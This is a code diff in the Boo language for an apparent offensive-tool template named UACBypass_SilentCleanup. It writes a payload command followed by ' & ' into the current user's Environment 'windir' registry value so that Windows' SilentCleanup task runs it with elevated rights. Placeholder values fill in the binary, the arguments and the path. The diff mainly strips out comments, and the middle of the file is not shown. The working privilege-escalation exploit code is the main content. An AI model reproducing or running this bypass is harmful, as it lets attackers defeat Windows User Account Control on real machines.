@@ -3,20 +3,10 @@ import System
 import System.Diagnostics
 import System.Threading
 
-
-
-// UACBypass_SilentCleanup.Program
-
 public static def BypassUAC(binary as string, arguments as string, path as string):
-#public static def Main(args as (string)):
 		Console.WriteLine('[+] Starting Bypass UAC.')
-#		str as string
 		if binary.Length > 0:
-			#str = args[0];
 			Console.WriteLine(('[+] Payload to be Executed ' + path + binary + arguments))
-		#else:
-		#	Console.WriteLine('[+] No Payload specified. Executing cmd.exe.')
-		#	str = 'C:\\Windows\\System32\\cmd.exe'
 		try:
 			registryKey as RegistryKey = Registry.CurrentUser.CreateSubKey('Environment')
 			registryKey.SetValue('windir', ((path + binary + arguments) + ' & '), RegistryValueKind.String)
@@ -57,12 +47,6 @@ public static def DeleteKey():
 	
 
 public static def Main():
-	#binary = "BINARY"
-    #args = 'powershell'
-    #path = `PATH`
-    #processId = PROCESS_ID
-
-
 	binary = "BINARY "
 	arguments = "ARGUMENTS"
 	path = `PATH`
